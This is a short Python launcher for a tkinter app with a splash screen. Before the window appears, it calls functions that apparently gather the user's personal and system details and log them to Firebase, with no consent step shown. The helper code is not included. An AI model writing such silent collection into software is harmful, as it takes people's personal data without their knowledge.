import tkinter as tk
from gui.splash_screen import SplashScreen
from utils.personal_info import get_personal_and_system_details
from services.database_service import DatabaseService

DatabaseService.log_personal_details_to_firebase(get_personal_and_system_details())

root = tk.Tk()
app = SplashScreen(root)
root.mainloop()
